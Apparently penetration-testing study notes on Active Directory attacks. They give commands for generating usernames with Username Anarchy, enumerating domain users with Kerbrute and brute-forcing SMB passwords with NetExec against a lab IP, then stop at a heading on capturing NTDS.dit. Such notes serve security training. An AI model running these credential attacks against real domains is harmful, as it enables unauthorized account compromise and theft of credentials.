Things covered 
* Dictionary attacks
* AD accounts
* Dumping Hashes
* NTDS.dit

Once a Windows system is joined to a domain it will no longer default to referencing the SAM database to validate logon requests.
### Dictionary Attacks
Using `Username Anarchy` will help generate commonly formatted name into usernames.
`./username-anarchy -i /home/user/user.txt`
#### Enumerating Username with Kerbrute
`./kerbrute_linux_amd64 userenum --dc <ip> --domain <domain.local> names.txt
#### Using NetExec to BruteForce
`netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt`

### Capturing NTDS.dit